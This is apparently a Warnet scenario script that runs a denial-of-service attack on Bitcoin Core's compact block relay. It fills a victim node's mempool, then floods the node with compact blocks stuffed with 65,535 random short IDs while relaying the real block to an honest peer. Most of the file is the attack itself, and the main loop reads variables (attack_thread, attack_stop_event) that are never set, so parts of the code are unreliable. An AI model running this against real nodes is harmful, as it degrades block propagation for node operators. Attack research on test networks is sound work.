#!/usr/bin/env python3

from decimal import Decimal
from pprint import (
    pp,
)

import random
import threading
import socket
from datetime import (
    datetime,
    timedelta,
)
import time

from commander import Commander

from test_framework.test_framework import BitcoinTestFramework
from test_framework.blocktools import (
    add_witness_commitment,
    create_block,
    create_coinbase,
    COINBASE_MATURITY,
    NORMAL_GBT_REQUEST_PARAMS,
)

from test_framework.wallet import (
    MiniWallet,
)

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    CBlockHeader,
    CInv,
    HeaderAndShortIDs,
    msg_block,
    msg_cmpctblock,
    msg_headers,
)

from test_framework.p2p import (
    P2PInterface,
)
from test_framework.util import (
    assert_equal,
    assert_greater_than,
    create_lots_of_big_transactions,
    gen_return_txouts
)


def fill_mempool(test_framework, node, *, tx_sync_fun=None):
    """Fill mempool until eviction.

    Allows for simpler testing of scenarios with floating mempoolminfee > minrelay
    Requires -maxmempool=5.
    To avoid unintentional tx dependencies, the mempool filling txs are created with a
    tagged ephemeral miniwallet instance.
    """
    test_framework.log.info("Fill the mempool until eviction is triggered and the mempoolminfee rises")
    txouts = gen_return_txouts()
    minrelayfee = node.getnetworkinfo()['relayfee']

    tx_batch_size = 1
    num_of_batches = 75
    # Generate UTXOs to flood the mempool
    # 1 to create a tx initially that will be evicted from the mempool later
    # 75 transactions each with a fee rate higher than the previous one
    ephemeral_miniwallet = MiniWallet(node)
    test_framework.generate(ephemeral_miniwallet, 1 + num_of_batches * tx_batch_size)

    # Mine enough blocks so that the UTXOs are allowed to be spent
    test_framework.generate(node, COINBASE_MATURITY - 1)

    # Get all UTXOs up front to ensure none of the transactions spend from each other, as that may
    # change their effective feerate and thus the order in which they are selected for eviction.
    confirmed_utxos = [ephemeral_miniwallet.get_utxo(confirmed_only=True) for _ in range(num_of_batches * tx_batch_size + 1)]
    assert_equal(len(confirmed_utxos), num_of_batches * tx_batch_size + 1)

    test_framework.log.debug("Create a mempool tx that will be evicted")
    tx_to_be_evicted_id = ephemeral_miniwallet.send_self_transfer(
        from_node=node, utxo_to_spend=confirmed_utxos.pop(0), fee_rate=minrelayfee)["txid"]

    def send_batch(fee):
        utxos = confirmed_utxos[:tx_batch_size]
        create_lots_of_big_transactions(ephemeral_miniwallet, node, fee, tx_batch_size, txouts, utxos)
        del confirmed_utxos[:tx_batch_size]

    # Increase the tx fee rate to give the subsequent transactions a higher priority in the mempool
    # The tx has an approx. vsize of 65k, i.e. multiplying the previous fee rate (in sats/kvB)
    # by 130 should result in a fee that corresponds to 2x of that fee rate
    base_fee = minrelayfee * 130
    batch_fees = [(i + 1) * base_fee for i in range(num_of_batches)]

    test_framework.log.debug("Fill up the mempool with txs with higher fee rate")
    for fee in batch_fees[:-3]:
        send_batch(fee)
    tx_sync_fun() if tx_sync_fun else test_framework.sync_mempools(timeout=600)  # sync before any eviction
    assert_equal(node.getmempoolinfo()["mempoolminfee"], minrelayfee)
    for fee in batch_fees[-3:]:
        send_batch(fee)
    tx_sync_fun() if tx_sync_fun else test_framework.sync_mempools(timeout=600)  # sync after all evictions

    test_framework.log.debug("The tx should be evicted by now")
    # The number of transactions created should be greater than the ones present in the mempool
    assert_greater_than(tx_batch_size * num_of_batches, len(node.getrawmempool()))
    # Initial tx created should not be present in the mempool anymore as it had a lower fee rate
    assert tx_to_be_evicted_id not in node.getrawmempool()

    test_framework.log.debug("Check that mempoolminfee is larger than minrelaytxfee")
    assert_equal(node.getmempoolinfo()['minrelaytxfee'], minrelayfee)
    assert_greater_than(node.getmempoolinfo()['mempoolminfee'], minrelayfee)



# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.

class CmpctAtk(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 0
        self.rpc_timeout = 600

    def add_options(self, parser):
        parser.description = (
            "CMPCT BLOCKS THEY SLOW"
        )
        parser.usage = "warnet run scenarios/cmpctatk.py"

    def connect_to_hostname(self, hostname):
        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(hostname)
        if chain == "regtest":
            dstport = 18444

        conn = P2PInterface()
        conn.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="regtest", timeout_factor=1
        )()
        conn.wait_until(lambda: conn.is_connected, check_connected=False)
        return conn

    def build_block_on_tip(self, node):
        if self.wallet.get_balance() == 0:
            print("Generating 101 blocks to the miner address for funding.")
            self.generatetoaddress(node, 111, self.wallet.get_address(), sync_fun=self.no_op)
            self.wallet.rescan_utxos()
            assert (self.wallet.get_balance() > 0)

        fee = Decimal(random.randrange(1, 1000) / 100_000_000)
        txlist = [self.wallet.create_self_transfer(fee=fee)['tx']]

        block = create_block(tmpl=self.nodes[0].getblocktemplate(NORMAL_GBT_REQUEST_PARAMS), txlist=txlist)
        add_witness_commitment(block)
        block.solve()
        return block

    def build_fat_empty_cmpct(self, block):
        cmpct_block = HeaderAndShortIDs()
        cmpct_block.header = CBlockHeader(block)

        for i in range(65_535):
            shortid = int.from_bytes(random.randbytes(6), byteorder='little')
            cmpct_block.shortids.append(shortid)

        return cmpct_block

    def peer_requested_hash(self, conn, hash):
        """Checks if any getdata message contains a given hash."""

        last_data = conn.last_message.get("getdata")
        if not last_data:
            return False
        for item in last_data.inv:
            if item.hash == hash:
                return True

        return False
        # return any(x.hash == hash for x in last_data.inv)

    def run_test(self):
        attacker = self.tanks['miner']
        victim = "victim"
        honest = "honest"

        # Set-up, to get some funds in the wallet.
        honestpeer = self.connect_to_hostname(honest)

        self.wallet = MiniWallet(attacker)
        self.log.info("Creating funding block.")
        funding_block = self.build_block_on_tip(attacker)
        self.log.info("Sending funding block header to honest peer.")
        honestpeer.send_message(msg_headers([CBlockHeader(funding_block)]))
        self.log.info("Waiting for getdata...")
        honestpeer.wait_for_getdata([funding_block.sha256], timeout=5)
        self.log.info("Getdata received, sending block.")
        honestpeer.send_and_ping(msg_block(funding_block))

        self.log.info(f"Filling {victim}'s mempool.")
        fill_mempool(self, self.tanks[victim])

        self.log.info(f"Attacking {victim}")
        attackers = []
        for _ in range(3):
            attackers.append(self.connect_to_hostname(victim))

        next_block_interrupt_time = None
        honestpeer_received = False
        while True:
            now = datetime.now()
            if next_block_interrupt_time is None or (honestpeer_received and now > next_block_interrupt_time):
                # When creating new block (at the top of the timeout condition):
                if attack_thread and attack_thread.is_alive():
                    self.log.info("Killing existing attack thread.")
                    # signal the spam thread to stop and wait shortly for it to exit
                    assert(attack_stop_event is not None)
                    attack_stop_event.set()
                    attack_thread.join(timeout=1.0)
                    attack_thread = None
                    time.sleep(5)

                self.log.info("Timeout reached, refreshing attack block.")
                real_block = self.build_block_on_tip(attacker)
                attack_block_header_and_shortids = self.build_fat_empty_cmpct(real_block).to_p2p()
                attack_block_msg = msg_cmpctblock(attack_block_header_and_shortids)
                next_block_interrupt_time = datetime.now() + timedelta(seconds=15)
                honestpeer_received = False

            for conn in attackers:
                conn.send_message(attack_block_msg)

            # If the honest peer has not already received the block, and has
            # requested the block after receiving the header from us: send the block.
            if not honestpeer_received:
                honestpeer.send_message(msg_headers([CBlockHeader(real_block)]))
                honestpeer.wait_for_getdata([real_block.sha256], timeout=5)
                honestpeer.send_and_ping(msg_block(real_block))
                honestpeer_received = True
                self.log.info(f"Honest peer sent us a getdata for {real_block.sha256} and we responded.")

def main():
    CmpctAtk().main()


if __name__ == "__main__":
    main()
